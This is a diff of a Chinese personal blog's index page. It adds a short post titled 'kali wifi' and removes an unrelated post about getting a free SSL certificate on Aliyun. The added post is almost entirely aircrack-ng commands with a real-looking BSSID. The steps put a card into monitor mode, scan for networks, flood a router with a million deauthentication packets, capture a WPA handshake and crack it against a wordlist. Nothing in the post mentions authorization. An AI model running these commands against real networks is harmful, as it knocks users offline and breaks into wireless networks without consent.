@@ -146,6 +146,83 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-kali-wifi" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/05/06/kali-wifi/">kali wifi</a>
+    </h1>
+  
+
+        
+        <a href="/2022/05/06/kali-wifi/" class="archive-article-date">
+  	<time datetime="2022-05-06T10:14:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-05-06</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 打开wifi monitor mode</span></span><br><span class="line">sudo airmon-ng start wlan0  #开启monitor 模式</span><br><span class="line">airodump-ng --band abg wlan0mon #扫描附近的wifi</span><br><span class="line">airodump-ng --bssid 64:6E:97:79:EC:52 --channel x wlan0mon #监控特定wifi</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 对路由器发包阻塞</span></span><br><span class="line">aireplay-ng --deauth 1000000 -a 64:6E:97:79:EC:52 -c 64:6E:97:79:EC:52 wlan0mon</span><br><span class="line"><span class="meta">#</span><span class="bash"> -a 后跟路由器mac</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -c 后跟客户端mac</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> WPA/WPA2 CRACKING</span></span><br><span class="line"><span class="meta">#</span><span class="bash">监控特定wifi</span></span><br><span class="line">airodump-ng --bssid 64:6E:97:79:EC:52 --channel x --write wpa_handshake wlan0mon </span><br><span class="line"><span class="meta">#</span><span class="bash">发送10个断连请求</span></span><br><span class="line">aireplay-ng --deauth 10 -a 64:6E:97:79:EC:52 -c 64:6E:97:79:EC:52 wlan0mon </span><br><span class="line"><span class="meta">#</span><span class="bash"> 尝试抓到握手包</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 抓到握手包之后 用字典遍历</span></span><br><span class="line">aircrack-ng -a -w dict freedom-*.cap </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/05/06/kali-wifi/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+
+  
     <article id="post-企业微信H5部署" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -816,85 +893,6 @@
 
 
   
-    <article id="post-阿里云申请免费ssl" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/02/26/%E9%98%BF%E9%87%8C%E4%BA%91%E7%94%B3%E8%AF%B7%E5%85%8D%E8%B4%B9ssl/">阿里云申请免费ssl</a>
-    </h1>
-  
-
-        
-        <a href="/2022/02/26/%E9%98%BF%E9%87%8C%E4%BA%91%E7%94%B3%E8%AF%B7%E5%85%8D%E8%B4%B9ssl/" class="archive-article-date">
-  	<time datetime="2022-02-26T07:29:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-26</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1jS4y1o7QW">https://www.bilibili.com/video/BV1jS4y1o7QW</a></p>
-<p>ssl申请成功后, 将密钥上传到nginx目录下 参考文档</p>
-<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/98728.html?spm=5176.b657008.help.dexternal.7b14799dK17HV1">https://help.aliyun.com/document_detail/98728.html?spm=5176.b657008.help.dexternal.7b14799dK17HV1</a></p>
-<p>开启ECS 443 https端口</p>
-<p>重启nginx</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">部署</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/02/26/%E9%98%BF%E9%87%8C%E4%BA%91%E7%94%B3%E8%AF%B7%E5%85%8D%E8%B4%B9ssl/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
@@ -1153,6 +1151,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">wordpress</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">独立站搭建</a>
               </li>
             
             <div class="clearfix"></div>
